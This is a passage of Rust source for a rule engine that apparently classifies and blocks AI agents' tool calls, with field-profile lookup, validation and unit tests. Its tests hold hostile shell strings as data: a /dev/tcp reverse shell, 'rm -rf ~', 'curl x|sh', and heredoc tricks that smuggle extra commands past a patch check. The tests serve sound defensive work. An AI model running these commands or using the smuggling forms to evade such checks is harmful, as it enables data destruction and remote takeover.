    /// so `.find()` over this Vec returns the highest-priority glob match.
    glob_indices: Vec<usize>,
}

impl FieldProfileSet {
    /// Build from an unsorted list. Stable-sorts by `(priority, original
    /// position)` so deterministic conflict resolution falls out of
    /// iteration order, then partitions profiles into a literal-pattern hash
    /// index and a glob-fallback list.
    pub fn new(mut profiles: Vec<FieldProfile>) -> Self {
        let mut indexed: Vec<(usize, FieldProfile)> = profiles.drain(..).enumerate().collect();
        indexed.sort_by_key(|(idx, p)| (p.priority, *idx));
        let profiles: Vec<FieldProfile> = indexed.into_iter().map(|(_, p)| p).collect();

        let mut literal_index: std::collections::HashMap<
            (Specificity, String, String),
            Vec<usize>,
        > = std::collections::HashMap::new();
        let mut glob_indices: Vec<usize> = Vec::new();
        for (i, p) in profiles.iter().enumerate() {
            let tier = profile_specificity(p);
            let tool_alts = pattern_alternates(&p.tool_pattern);
            let tool_literal_only = !tool_alts.is_empty()
                && tool_alts.iter().all(|a| alternate_is_literal(a));
            let scope_alts: Vec<String> = match tier {
                Specificity::ServerType => p
                    .server_type
                    .as_deref()
                    .map(|s| vec![s.to_ascii_lowercase()])
                    .unwrap_or_default(),
                Specificity::Mcp => p
                    .mcp_server
                    .as_deref()
                    .map(|s| vec![s.to_ascii_lowercase()])
                    .unwrap_or_default(),
                Specificity::App => p
                    .app_filter
                    .as_deref()
                    .map(|f| {
                        pattern_alternates(f)
                            .into_iter()
                            .map(|a| a.to_ascii_lowercase())
                            .collect()
                    })
                    .unwrap_or_default(),
                Specificity::Generic => vec![String::new()],
            };
            let scope_literal_only = match tier {
                Specificity::ServerType => true,
                Specificity::Mcp => true,
                Specificity::App => !scope_alts.is_empty()
                    && p.app_filter
                        .as_deref()
                        .is_some_and(|f| pattern_alternates(f).iter().all(|a| alternate_is_literal(a))),
                Specificity::Generic => true,
            };
            // Index every (scope_alt, tool_alt) pair as a literal key when
            // both sides are pure-literal. Patterns with any `*` or App-tier
            // glob filters fall through to `glob_indices`. A profile can be
            // in BOTH the literal index AND glob_indices if only some
            // alternates are literal — find/lookup pick the higher-priority
            // (lower-index) match between the two paths so this can't double-
            // count.
            if tool_literal_only && scope_literal_only {
                for scope_key in &scope_alts {
                    for alt in &tool_alts {
                        let tool_key = alt.to_ascii_lowercase();
                        literal_index
                            .entry((tier, scope_key.clone(), tool_key))
                            .or_default()
                            .push(i);
                    }
                }
            } else {
                glob_indices.push(i);
            }
        }

        Self { profiles, literal_index, glob_indices }
    }

    /// Resolve `(tool_name, app_id, mcp_server, canonical_field)` to a
    /// matching profile. Returns the canonical `tool_id`, the `wire_field`
    /// to fetch from `arguments`, the normaliser, and the matched profile
    /// id. Precedence: `server_type > mcp > app > generic` (the `server_type`
    /// tier never fires through this entry point — it has no `server_type`
    /// argument; use [`lookup_with_server_type`] when the caller has a
    /// server-tool discriminator). Then by `priority` ASC, then by load
    /// position.
    pub fn lookup(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        canonical_field: &str,
    ) -> Option<FieldMatch<'_>> {
        self.lookup_with_server_type(tool_name, app_id, mcp_server, None, canonical_field)
    }

    /// Variant of [`lookup`] that also pivots on the inbound tool's
    /// `server_type` (Anthropic `web_search_20250305`, OpenAI Responses
    /// `web_search_preview`, Gemini `google_search`, ...). Match precedence
    /// is `ServerType > Mcp > App > Generic` — a server-type entry wins
    /// over an app- or mcp-scoped profile that happens to match on name.
    /// Pass `server_type = None` for plain function-tool lookups (the
    /// `lookup` shorthand does this).
    pub fn lookup_with_server_type(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        server_type: Option<&str>,
        canonical_field: &str,
    ) -> Option<FieldMatch<'_>> {
        let tool_lower = tool_name.to_ascii_lowercase();
        for tier in [
            Specificity::ServerType,
            Specificity::Mcp,
            Specificity::App,
            Specificity::Generic,
        ] {
            let scope_key = match self.scope_key_for(tier, app_id, mcp_server, server_type) {
                Some(s) => s,
                None => continue,
            };
            let literal_idx = self
                .literal_index
                .get(&(tier, scope_key, tool_lower.clone()))
                .and_then(|idxs| {
                    idxs.iter()
                        .copied()
                        .find(|&i| self.profiles[i].field == canonical_field)
                });
            let glob_idx = self.glob_indices.iter().copied().find(|&i| {
                let p = &self.profiles[i];
                profile_specificity(p) == tier
                    && p.field == canonical_field
                    && profile_matches(p, tool_name, app_id, mcp_server, server_type)
            });
            let best = match (literal_idx, glob_idx) {
                (Some(l), Some(g)) => Some(l.min(g)),
                (Some(l), None) => Some(l),
                (None, Some(g)) => Some(g),
                (None, None) => None,
            };
            if let Some(i) = best {
                let p = &self.profiles[i];
                return Some(FieldMatch {
                    tool_id: &p.tool_id,
                    wire_field: p.wire_field.as_deref(),
                    normalizer: p.normalizer,
                    profile_id: p.id.as_deref(),
                });
            }
        }
        None
    }

    /// Resolve `(tool_name, app_id, mcp_server)` to a `tool_id` without
    /// requiring a specific field. Returns the first matching profile's
    /// `tool_id` under the same precedence rules as [`lookup`]; useful for
    /// classifying tools that don't expose any matching field (or for the
    /// `target: tool_id` resolver).
    pub fn resolve_tool_id<'a>(
        &'a self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
    ) -> Option<&'a str> {
        self.find_tool_profile(tool_name, app_id, mcp_server, None)
            .map(|p| p.tool_id.as_str())
    }

    /// Same as [`resolve_tool_id`] but returns the owned ids together so
    /// callers can surface the resolving profile id alongside the tool_id.
    pub fn resolve_tool_id_with_profile(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
    ) -> Option<ToolIdMatch> {
        self.find_tool_profile(tool_name, app_id, mcp_server, None)
            .map(|p| ToolIdMatch {
                tool_id: p.tool_id.clone(),
                profile_id: p.id.clone(),
            })
    }

    /// Server-type-aware variant of [`resolve_tool_id_with_profile`]. Used by
    /// the tool-policy walker on inbound `DomainTool` lookups so server-tools
    /// (`web_search_20250305`, `web_search_preview`, ...) canonicalise to
    /// `web_search` / `web_fetch` regardless of the wire `name` the client
    /// chose. `server_type = None` falls back to the same precedence as
    /// [`resolve_tool_id_with_profile`].
    pub fn resolve_tool_id_for_definition(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        server_type: Option<&str>,
    ) -> Option<ToolIdMatch> {
        self.find_tool_profile(tool_name, app_id, mcp_server, server_type)
            .map(|p| ToolIdMatch {
                tool_id: p.tool_id.clone(),
                profile_id: p.id.clone(),
            })
    }

    fn find_tool_profile(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        server_type: Option<&str>,
    ) -> Option<&FieldProfile> {
        let tool_lower = tool_name.to_ascii_lowercase();
        for tier in [
            Specificity::ServerType,
            Specificity::Mcp,
            Specificity::App,
            Specificity::Generic,
        ] {
            let scope_key = match self.scope_key_for(tier, app_id, mcp_server, server_type) {
                Some(s) => s,
                None => continue,
            };
            let literal_idx = self
                .literal_index
                .get(&(tier, scope_key, tool_lower.clone()))
                .and_then(|idxs| idxs.first().copied());
            let glob_idx = self.glob_indices.iter().copied().find(|&i| {
                let p = &self.profiles[i];
                profile_specificity(p) == tier
                    && profile_matches(p, tool_name, app_id, mcp_server, server_type)
            });
            let best = match (literal_idx, glob_idx) {
                (Some(l), Some(g)) => Some(l.min(g)),
                (Some(l), None) => Some(l),
                (None, Some(g)) => Some(g),
                (None, None) => None,
            };
            if let Some(i) = best {
                return Some(&self.profiles[i]);
            }
        }
        None
    }

    /// Compute the literal-index probe scope_key for a tier given the request
    /// context. Returns `None` when the tier is unreachable (e.g. App tier
    /// with no `app_id` — `profile_matches` would also reject every profile).
    fn scope_key_for(
        &self,
        tier: Specificity,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        server_type: Option<&str>,
    ) -> Option<String> {
        match tier {
            Specificity::ServerType => server_type.map(|s| s.to_ascii_lowercase()),
            Specificity::Mcp => mcp_server.map(|s| s.to_ascii_lowercase()),
            Specificity::App => app_id.map(|s| s.to_ascii_lowercase()),
            Specificity::Generic => Some(String::new()),
        }
    }

    /// Resolve `(tool_name, app_id, mcp_server)` to every matching profile,
    /// one per distinct canonical `field`. Used by `target: "any_arg"` to
    /// scan every profile-known arg of a tool in a single rule condition.
    /// Tier precedence (server_type > mcp > app > generic) wins per-field:
    /// once a higher tier registers a profile for `field=path`, lower-tier
    /// profiles for the same field are shadowed. Within a tier, the
    /// lowest-priority-index profile (the one `lookup` would also pick) wins.
    /// Result is sorted by canonical field for deterministic audit / snapshot
    /// behaviour.
    pub fn lookup_all_fields(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
    ) -> Vec<(String, FieldMatch<'_>)> {
        self.lookup_all_fields_with_server_type(tool_name, app_id, mcp_server, None)
    }

    /// Server-type-aware variant of [`lookup_all_fields`].
    pub fn lookup_all_fields_with_server_type(
        &self,
        tool_name: &str,
        app_id: Option<&str>,
        mcp_server: Option<&str>,
        server_type: Option<&str>,
    ) -> Vec<(String, FieldMatch<'_>)> {
        let tool_lower = tool_name.to_ascii_lowercase();
        let mut by_field: std::collections::HashMap<String, usize> =
            std::collections::HashMap::new();
        for tier in [
            Specificity::ServerType,
            Specificity::Mcp,
            Specificity::App,
            Specificity::Generic,
        ] {
            let scope_key = match self.scope_key_for(tier, app_id, mcp_server, server_type) {
                Some(s) => s,
                None => continue,
            };
            let mut candidates: Vec<usize> = self
                .literal_index
                .get(&(tier, scope_key, tool_lower.clone()))
                .cloned()
                .unwrap_or_default();
            for &i in &self.glob_indices {
                let p = &self.profiles[i];
                if profile_specificity(p) == tier
                    && profile_matches(p, tool_name, app_id, mcp_server, server_type)
                {
                    candidates.push(i);
                }
            }
            // Lower index == higher priority. Sort then `or_insert` keeps the
            // best candidate per field at this tier and shadows lower tiers.
            candidates.sort_unstable();
            for i in candidates {
                let field = self.profiles[i].field.clone();
                by_field.entry(field).or_insert(i);
            }
        }
        let mut out: Vec<(String, FieldMatch<'_>)> = by_field
            .into_iter()
            .map(|(field, i)| {
                let p = &self.profiles[i];
                (
                    field,
                    FieldMatch {
                        tool_id: &p.tool_id,
                        wire_field: p.wire_field.as_deref(),
                        normalizer: p.normalizer,
                        profile_id: p.id.as_deref(),
                    },
                )
            })
            .collect();
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    pub fn iter(&self) -> impl Iterator<Item = &FieldProfile> {
        self.profiles.iter()
    }

    pub fn len(&self) -> usize {
        self.profiles.len()
    }

    pub fn is_empty(&self) -> bool {
        self.profiles.is_empty()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum Specificity {
    /// Server-side server-tool discriminator. Profiles set
    /// `server_type` (e.g. `web_search_20250305`); inbound `DomainTool`
    /// lookups pivot here when the client's tool def carried that type.
    /// Highest-precedence tier — server-tools always canonicalise to a
    /// fixed `tool_id` regardless of the wire `name`.
    ServerType,
    Mcp,
    App,
    Generic,
}

/// Split a pattern on `|` into trimmed non-empty alternates. Pipe-alternation
/// is the only "compound" syntax in [`matches_glob`]; everything else is per-
/// alternate `matches_single_glob`. Pure-literal alternation can therefore be
/// indexed by registering each alternate as its own literal key.
fn pattern_alternates(pat: &str) -> Vec<&str> {
    pat.split('|')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect()
}

/// Detect a single alternate that is purely literal (no `*` wildcard).
fn alternate_is_literal(alt: &str) -> bool {
    !alt.contains('*')
}

fn profile_specificity(p: &FieldProfile) -> Specificity {
    if p.server_type.is_some() {
        Specificity::ServerType
    } else if p.mcp_server.is_some() {
        Specificity::Mcp
    } else if p.app_filter.is_some() {
        Specificity::App
    } else {
        Specificity::Generic
    }
}

/// Does this profile match `(tool_name, app_id, mcp_server, server_type)`?
/// Tool-pattern match always required; app/mcp/server_type gates apply per
/// profile specificity.
fn profile_matches(
    p: &FieldProfile,
    tool_name: &str,
    app_id: Option<&str>,
    mcp_server: Option<&str>,
    server_type: Option<&str>,
) -> bool {
    if !matches_glob(tool_name, &p.tool_pattern) {
        return false;
    }
    match (&p.server_type, &p.mcp_server, &p.app_filter) {
        (Some(want), _, _) => server_type.is_some_and(|s| s.eq_ignore_ascii_case(want)),
        (None, Some(want_server), _) => {
            mcp_server.is_some_and(|s| s.eq_ignore_ascii_case(want_server))
        }
        (None, None, Some(filter)) => app_id.is_some_and(|a| matches_glob(a, filter)),
        (None, None, None) => true,
    }
}

/// Validation failure modes for incoming `FieldProfile` writes. Mirrors the
/// shape of [`ValidationError`] but kept as a separate enum so the admin-side
/// `ApiErrorCode` mapping stays unambiguous.
#[derive(Debug)]
pub enum FieldProfileValidationError {
    /// `tool_pattern` is empty or all whitespace.
    EmptyToolPattern,
    /// `field` is empty or all whitespace.
    EmptyField,
    /// `field` contains characters that don't appear in JSON object keys
    /// commonly enough to matter — kept restrictive to catch typos like
    /// `arg.command` (the `arg.` prefix is rule-side syntax, not a field).
    InvalidFieldChar { ch: char },
    /// `tool_id` is empty.
    EmptyToolId,
    /// `tool_id` contains characters outside the conservative
    /// `[A-Za-z0-9_]` charset — keeps ids URL-safe and CSS-anchor-safe so
    /// the UI can deep-link by id.
    InvalidToolIdChar { ch: char },
    /// Both `app_filter` and `mcp_server` were set on the same profile.
    /// They are mutually exclusive (a profile is either app-scoped or
    /// mcp-server-scoped, never both).
    AppFilterMcpServerExclusive,
    /// `server_type` was set on the same profile as `app_filter` or
    /// `mcp_server`. The three scopes are mutually exclusive — a profile
    /// is either server-type-scoped, mcp-server-scoped, app-scoped, or
    /// generic, never a combination.
    ServerTypeScopeExclusive,
    /// An optional scope filter (`app_filter`, `mcp_server`, `server_type`)
    /// or `wire_field` was provided as an empty or whitespace-only string.
    /// Use `null` to clear instead — an empty filter would silently match
    /// nothing, making the profile dead config.
    EmptyScopeFilter { field: &'static str },
}

/// Validate a field profile at write time. Normaliser-kind validity is
/// enforced by serde at deserialisation; this only checks the human-author
/// fields.
pub fn validate_field_profile(p: &FieldProfile) -> Result<(), FieldProfileValidationError> {
    if p.tool_pattern.trim().is_empty() {
        return Err(FieldProfileValidationError::EmptyToolPattern);
    }
    if p.field.trim().is_empty() {
        return Err(FieldProfileValidationError::EmptyField);
    }
    for ch in p.field.chars() {
        if !ch.is_ascii_alphanumeric() && ch != '_' {
            return Err(FieldProfileValidationError::InvalidFieldChar { ch });
        }
    }
    if p.tool_id.trim().is_empty() {
        return Err(FieldProfileValidationError::EmptyToolId);
    }
    for ch in p.tool_id.chars() {
        if !ch.is_ascii_alphanumeric() && ch != '_' {
            return Err(FieldProfileValidationError::InvalidToolIdChar { ch });
        }
    }
    if p.app_filter.is_some() && p.mcp_server.is_some() {
        return Err(FieldProfileValidationError::AppFilterMcpServerExclusive);
    }
    if p.server_type.is_some() && (p.app_filter.is_some() || p.mcp_server.is_some()) {
        return Err(FieldProfileValidationError::ServerTypeScopeExclusive);
    }
    for (name, val) in [
        ("app_filter", &p.app_filter),
        ("mcp_server", &p.mcp_server),
        ("server_type", &p.server_type),
        ("wire_field", &p.wire_field),
    ] {
        if let Some(s) = val
            && s.trim().is_empty()
        {
            return Err(FieldProfileValidationError::EmptyScopeFilter { field: name });
        }
    }
    Ok(())
}

/// One known native server-tool wire tag — surfaced through the admin API so
/// the UI's `server_type` autocomplete tracks the canonical Rust source of
/// truth instead of a hard-coded copy. Operators can still author profiles
/// for unlisted providers; this is a suggestion list, not a closed set.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct KnownServerToolType {
    /// The wire-protocol tag stamped on `DomainTool.server_type` for this
    /// native server-tool.
    pub server_type: String,
    /// Human-readable provider name for UI display.
    pub label: String,
    /// One-line description for UI tooltips.
    pub description: String,
}

/// Canonical list of known native server-tool tags. Each entry corresponds to
/// a per-protocol parser site in `crates/streamscope-core/src/api/domain_request.rs`
/// that stamps `DomainTool.server_type` from the wire `type` field. Add a new
/// entry when a new provider's server-tool emitter lands.
pub fn known_server_tool_types() -> Vec<KnownServerToolType> {
    vec![
        KnownServerToolType {
            server_type: "web_search_20250305".to_string(),
            label: "Anthropic Messages".to_string(),
            description: "Anthropic's native web_search server-tool (date-versioned).".to_string(),
        },
        KnownServerToolType {
            server_type: "web_search_preview".to_string(),
            label: "OpenAI Responses".to_string(),
            description: "OpenAI Responses API's native web_search_preview server-tool.".to_string(),
        },
        KnownServerToolType {
            server_type: "google_search".to_string(),
            label: "Gemini".to_string(),
            description: "Google Gemini's native google_search server-tool.".to_string(),
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::assert_matches;

    /// A shell call that only applies a patch is decided as the shell call it
    /// is, and its reading as the patch tool can only ADD a block: a
    /// classify rule on the patch tool, first in order, never decides it in
    /// place of the shell's own block; a block rule on the patch tool's path
    /// blocks it where the shell's rules allow it; and a script that runs
    /// anything beside the patch gets no patch reading at all.
    #[test]
    fn a_shell_patch_reading_only_adds_a_block() {
        use crate::config::tool_rules_normalize::Normalizer;
        let set = FieldProfileSet::new(vec![
            fp("shell_exec", "shell", "command", Normalizer::Shell, 100),
            FieldProfile { wire_field: Some("input".into()), ..fp("edit_file", "apply_patch", "path", Normalizer::Patch, 100) },
        ]);
        let rule = |id: &str, action: &str, conditions: serde_json::Value| -> Rule {
            serde_json::from_value(json!({
                "id": id, "phase": "response", "scope": "tool_calls", "match": conditions,
                "action": {"kind": action}, "risk": "danger"
            }))
            .unwrap()
        };
        let rules = vec![
            rule("classify-edits", "classify", json!([{"target": "tool_id", "op": "equals", "value": "edit_file"}])),
            rule("block-root", "block", json!([
                {"target": "tool_id", "op": "equals", "value": "shell_exec"},
                {"target": "arg.command", "op": "contains_any", "value": ["/root/"]}])),
            rule("block-workflows", "block", json!([
                {"target": "tool_id", "op": "equals", "value": "edit_file"},
                {"target": "arg.path", "op": "glob", "value": ".github/workflows/*"}])),
        ];
        let decided = |command: serde_json::Value| {
            let args = json!({ "command": command });
            classify_tool_call(&rules, None, None, Some(&set), "shell", Some(&args)).id
        };
        let patch = |file: &str| format!("*** Begin Patch\n*** Add File: {file}\n+x\n*** End Patch");
        assert_eq!(decided(json!(["apply_patch", patch("/root/notes")])).as_deref(), Some("block-root"));
        assert_eq!(decided(json!(["apply_patch", patch(".github/workflows/ci.yml")])).as_deref(), Some("block-workflows"));
        assert_eq!(decided(json!(["apply_patch", patch("src/main.rs")])), None);
        // A `<<-` heredoc a tab-indented delimiter closes early, running what
        // follows: not a patch, so no patch reading adds or decides anything.
        let early = format!("apply_patch <<-EOF\n{}\n\tEOF\nrm x\nEOF", patch(".github/workflows/ci.yml"));
        assert_eq!(decided(json!(["bash", "-lc", early])), None);
        // Run in a directory, the patch's files are read both as named and
        // under it: a rule anchored to the project still matches.
        let args = json!({ "command": ["apply_patch", patch(".github/workflows/ci.yml")], "workdir": "/repo" });
        assert_eq!(
            classify_tool_call(&rules, None, None, Some(&set), "shell", Some(&args)).id.as_deref(),
            Some("block-workflows")
        );
        // `./apply_patch` is a program Codex runs, not its patch command.
        assert_eq!(decided(json!(["./apply_patch", patch(".github/workflows/ci.yml")])), None);
    }

    /// A script reads as a patch only when it does nothing but apply one —
    /// the heredoc ending at its FIRST delimiter line, nothing after it, one
    /// plain delimiter word, a plain `cd` path. Each refused shape runs
    /// something beside the patch.
    #[test]
    fn only_a_script_that_only_applies_a_patch_reads_as_one() {
        let patch = "*** Begin Patch\n*** Add File: a\n+x\n*** End Patch";
        for script in [
            format!("apply_patch <<'EOF'\n{patch}\nEOF\n"),
            format!("apply_patch <<\"EOF\"\n{patch}\nEOF"),
            format!("applypatch <<EOF\n{patch}\nEOF\n\n"),
            format!("apply_patch << 'EOF'\r\n{patch}\nEOF\n"),
        ] {
            assert_eq!(heredoc_patch(&script).as_deref(), Some(patch), "{script:?}");
        }
        // Applied in another directory, the patch's relative files are read
        // there; `<<-` strips every body line's leading tabs, as the shell does.
        let moved = heredoc_patch(&format!("cd /work/repo && apply_patch <<'PATCH'\n{patch}\nPATCH\n"));
        assert_eq!(moved.as_deref(), Some(patch.replace("Add File: a", "Add File: a\n*** Add File: /work/repo/a").as_str()));
        let tabbed = patch.lines().map(|l| format!("\t{l}")).collect::<Vec<_>>().join("\n");
        assert_eq!(heredoc_patch(&format!("apply_patch <<-EOF\n{tabbed}\n\tEOF\n")).as_deref(), Some(patch));
        for script in [
            format!("apply_patch <<'EOF'\n{patch}\nEOF\nrm -rf ~\nEOF"),
            format!("apply_patch <<'EOF';rm -rf ~\n{patch}\nEOF"),
            format!("cd $(curl x|sh) && apply_patch <<EOF\n{patch}\nEOF"),
            format!("cd /tmp; rm -rf ~ && apply_patch <<EOF\n{patch}\nEOF"),
            format!("apply_patch <<'EOF' && rm -rf ~\n{patch}\nEOF"),
            format!("apply_patch <<'E O F'\n{patch}\nE O F"),
            format!("apply_patch <<'EOF'\n{patch}"),
        ] {
            assert_eq!(heredoc_patch(&script), None, "{script:?}");
        }
    }
    use serde_json::json;

    fn classify_rule_for_tool_id(tool_id: &str, risk: &str) -> Rule {
        Rule {
            id: format!("test-classify-{tool_id}"),
            title: None,
            description: None,
            risk: risk.to_string(),
            phase: Phase::Response,
            scope: Scope::ToolCalls,
            conditions: vec![MatchCondition {
                target: "tool_id".to_string(),
                op: Op::Equals,
                value: json!(tool_id),
            }],
            action: RuleAction::Classify,
            priority: 100,
            model_filter: None,
            app_filter: None,
            mcp_server_filter: None,
            a2a_agent_filter: None,
            enabled: true,
            framework_refs: vec![],
            is_builtin: false,
            profile_id: None,
            forked_from: None,
        }
    }

    fn detector_rule(detector: &str) -> Rule {
        Rule {
            conditions: vec![MatchCondition {
                target: "arg.command".to_string(),
                op: Op::Detector,
                value: json!(detector),
            }],
            ..classify_rule_for_tool_id("shell_exec", "danger")
        }
    }

    /// A `detector` condition runs through the same `evaluate` path as every
    /// other op, resolver hand-off included — which a unit test of the detector
    /// alone cannot cover. No field profile is registered here, so the value
    /// arrives un-normalised: the case each detector canonicalises for itself.
    #[test]
    fn detector_op_evaluates_through_the_rule_engine() {
        let rule = detector_rule("is_reverse_shell");
        let hit = json!({ "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" });
        let miss = json!({ "command": "ls -la /tmp" });
        for (args, expected) in [(&hit, true), (&miss, false)] {
            let ctx = ToolCallResolver {
                name: "Bash",
                arguments: Some(args),
                field_profiles: None,
                app_id: None,
                mcp_server: None,
                tool_id: Some("shell_exec"),
            };
            assert_eq!(evaluate(&rule, &ctx), expected, "args: {args}");
        }
    }

    /// An unknown detector name is refused at write time, and write time is the
    /// ONLY gate: at runtime such a condition never matches, so a `block` rule
    /// naming a typo'd detector would silently permit everything it was written
    /// to stop.
    #[test]
    fn validate_refuses_an_unknown_detector_name() {
        assert_matches!(validate(&detector_rule("is_reverse_shell")), Ok(()));
        assert_matches!(
            validate(&detector_rule("is_reverse_shel")),
            Err(ValidationError::UnknownDetector { .. })
        );
    }

    #[test]
    fn glob_matcher_basics() {
        assert!(matches_glob("Bash", "Bash"));
        assert!(matches_glob("bash", "Bash"));
        assert!(matches_glob("Read", "Read|Edit"));
        assert!(!matches_glob("Read", "Write|Edit"));
        assert!(matches_glob("read_file", "*read*"));
        assert!(matches_glob("anything", "*"));
    }

    #[test]
    fn parse_mcp_namespace_basic() {
        assert_eq!(parse_mcp_namespace("mcp__filesystem__read_file"), Some(("filesystem", "read_file")));
        assert_eq!(parse_mcp_namespace("mcp__postgres__query"), Some(("postgres", "query")));
        assert_eq!(parse_mcp_namespace("Bash"), None);
        assert_eq!(parse_mcp_namespace("mcp__filesystem"), None); // missing local
        assert_eq!(parse_mcp_namespace("mcp____read_file"), None); // empty server
    }

    fn fp(tool_id: &str, tool_pattern: &str, field: &str, n: crate::config::tool_rules_normalize::Normalizer, prio: i32) -> FieldProfile {
        FieldProfile {
            id: Some(format!("test-{tool_id}-{tool_pattern}-{field}")),
            description: None,
            source: None,
            tool_id: tool_id.to_string(),
            tool_pattern: tool_pattern.to_string(),
            app_filter: None,
            mcp_server: None,
            server_type: None,
            field: field.to_string(),
            wire_field: None,
            normalizer: n,
            priority: prio,
            is_builtin: false,
        }
    }

    /// The single form a resolver returned. Every target asserted through this
    /// helper resolves to exactly one — a second form would be a behaviour
    /// change, which is why this asserts rather than picking the first.
    fn sole_form(forms: Option<Vec<String>>) -> Option<String> {
        forms.map(|f| {
            assert_eq!(f.len(), 1, "expected a single form, got {f:?}");
            f.into_iter().next().expect("length asserted above")
        })
    }

    use crate::config::tool_rules_normalize::Normalizer;

    #[test]
    fn lookup_matches_literal_name() {
        let set = FieldProfileSet::new(vec![fp("shell_exec", "Bash", "command", Normalizer::Shell, 100)]);
        let m = set.lookup("Bash", None, None, "command").unwrap();
        assert_eq!(m.tool_id, "shell_exec");
        assert_eq!(m.normalizer, Normalizer::Shell);
        assert!(set.lookup("Bash", None, None, "other_field").is_none());
        assert!(set.lookup("OtherTool", None, None, "command").is_none());
    }

    #[test]
    fn lookup_uses_wire_field_when_set() {
        let mut p = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        p.wire_field = Some("target_file".to_string());
        let set = FieldProfileSet::new(vec![p]);
        let args = json!({"target_file": "/etc/passwd"});
        let resolver = ToolCallResolver {
            name: "read_file",
            arguments: Some(&args),
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
            tool_id: None,
        };
        // Rule writes `arg.path` (canonical); engine fetches `target_file` (wire).
        assert_eq!(sole_form(resolver.resolve("arg.path")).as_deref(), Some("/etc/passwd"));
    }

    #[test]
    fn lookup_falls_back_to_canonical_field_when_no_profile() {
        let set = FieldProfileSet::new(vec![]);
        let args = json!({"path": "/tmp/x"});
        let resolver = ToolCallResolver {
            name: "unknown_tool",
            arguments: Some(&args),
            field_profiles: Some(&set),
            app_id: None,
            mcp_server: None,
            tool_id: None,
        };
        // No profile → fetch `arguments[path]` raw (no normalisation).
        assert_eq!(sole_form(resolver.resolve("arg.path")).as_deref(), Some("/tmp/x"));
    }

    #[test]
    fn precedence_mcp_beats_app_beats_generic() {
        // Three profiles at same priority, all matching the tool name. MCP
        // wins for an MCP call; app wins for an app-only call; generic
        // covers the rest.
        let mut generic = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        generic.id = Some("GENERIC".into());
        let mut app = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        app.id = Some("APP".into());
        app.app_filter = Some("cursor-*".into());
        let mut mcp = fp("read_file", "read_file", "path", Normalizer::Path, 100);
        mcp.id = Some("MCP".into());
        mcp.mcp_server = Some("filesystem".into());

        let set = FieldProfileSet::new(vec![generic.clone(), app.clone(), mcp.clone()]);

        // MCP request → MCP profile wins
        assert_eq!(
            set.lookup("read_file", Some("cursor-1"), Some("filesystem"), "path")
                .and_then(|m| m.profile_id),
            Some("MCP")
        );
        // App request without MCP → app profile wins
        assert_eq!(
            set.lookup("read_file", Some("cursor-1"), None, "path")
                .and_then(|m| m.profile_id),
            Some("APP")
        );
        // Other app, no MCP → generic
        assert_eq!(
            set.lookup("read_file", Some("opencode"), None, "path")
                .and_then(|m| m.profile_id),
            Some("GENERIC")
        );
        // No app, no MCP → generic
        assert_eq!(
            set.lookup("read_file", None, None, "path")
                .and_then(|m| m.profile_id),
            Some("GENERIC")
        );
    }

    #[test]
    fn server_type_tier_outranks_generic() {
        // ServerType profile must win over a Generic profile even when the
        // wire `tool_name` would have matched both.
        let mut generic = fp("web_search", "web_search", "query", Normalizer::Raw, 100);
        generic.id = Some("GEN-WS".into());
        let mut server = fp("web_search", "web_search", "query", Normalizer::Raw, 100);
        server.id = Some("SVR-WS".into());
        server.server_type = Some("web_search_20250305".into());

        let set = FieldProfileSet::new(vec![generic.clone(), server.clone()]);

        // server_type matches → ServerType tier wins.
        assert_eq!(
            set.lookup_with_server_type(
                "web_search",
                None,
                None,
                Some("web_search_20250305"),
                "query",
            )
            .and_then(|m| m.profile_id),
            Some("SVR-WS")
        );
        // server_type missing → generic wins (fallback).
        assert_eq!(
            set.lookup_with_server_type("web_search", None, None, None, "query")
                .and_then(|m| m.profile_id),
            Some("GEN-WS")
        );
        // Wrong server_type → generic wins (the SVR-WS server-type doesn't match).
        assert_eq!(
            set.lookup_with_server_type(
                "web_search",
                None,
                None,
                Some("some_other_server_tool"),
                "query",
            )
            .and_then(|m| m.profile_id),
            Some("GEN-WS")
        );
    }

    #[test]
    fn server_type_canonicalises_tool_id_for_definition() {
        // resolve_tool_id_for_definition is what the request-phase walker
        // calls — confirm it canonicalises to the seeded `tool_id` even
        // when the wire name differs from the pattern.
        let mut server = fp("web_search", "web_search|google_search", "query", Normalizer::Raw, 100);
        server.server_type = Some("google_search".into());
        server.id = Some("SVR-GOOG".into());

        let set = FieldProfileSet::new(vec![server]);

        // wire name "web_search" + server_type "google_search" → web_search
        let m = set.resolve_tool_id_for_definition(
            "web_search",
            None,
            None,
            Some("google_search"),
        );
        assert_eq!(m.as_ref().map(|x| x.tool_id.as_str()), Some("web_search"));
        // wire name "google_search" + server_type "google_search" → web_search
        let m = set.resolve_tool_id_for_definition(
            "google_search",
            None,
            None,
            Some("google_search"),
        );
        assert_eq!(m.as_ref().map(|x| x.tool_id.as_str()), Some("web_search"));
        // wire name "google_search" without server_type → no match
        // (the seeded profile is server-type-scoped, not generic).
        assert!(set
            .resolve_tool_id_for_definition("google_search", None, None, None)
            .is_none());
    }

    #[test]
    fn server_type_validation_exclusive_with_app_and_mcp() {
        let mut p = fp("web_search", "web_search", "query", Normalizer::Raw, 100);
        p.server_type = Some("web_search_20250305".into());
        // Pure server_type — valid.
        assert!(validate_field_profile(&p).is_ok());

        // server_type + app_filter — rejected.
        p.app_filter = Some("claude-code".into());
        assert_matches!(
            validate_field_profile(&p),
            Err(FieldProfileValidationError::ServerTypeScopeExclusive)
        );

